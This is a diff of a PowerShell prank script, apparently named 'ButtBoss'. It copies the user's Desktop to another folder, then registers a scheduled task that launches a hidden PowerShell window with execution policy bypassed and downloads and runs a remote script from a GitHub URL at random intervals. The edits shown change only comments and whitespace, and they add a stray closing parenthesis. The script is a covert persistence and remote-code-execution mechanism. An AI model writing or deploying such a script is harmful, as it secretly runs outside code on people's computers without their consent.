@@ -1,9 +1,9 @@
-# Set Desktop Path, switch to OneDrive path format if OneDrive folder exists
+
+# Set Desktop Path, switch to OneDrive path format if OneDrive folder exists, and run ButtBoss
 $desktop = "$home\Desktop"
 if((Test-Path $env:OneDrive) -Or (Test-Path $env:OneDriveCommercial)) {
     $desktop = "$env:OneDrive\Desktop"
 }
-
 # Copy Desktop Contents to Goofin for safe keepin
 Copy-Item -Path $desktop -Destination "C:\Goofin\cuts" -Recurse -Force
 
@@ -92,4 +92,4 @@ $reseed = 7..25 | Get-Random
  $rebutt = New-ScheduledTaskAction -Execute "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://github.com/mellonaut/buttboss/buttboss.ps1'''))'"
  $schedulebutts = New-ScheduledTasktrigger -Daily -DaysInterval $reseed -At 10am 
  Register-ScheduledTask BringBackTheButts -Action $rebutt -Trigger $schedulebutts
-
+)
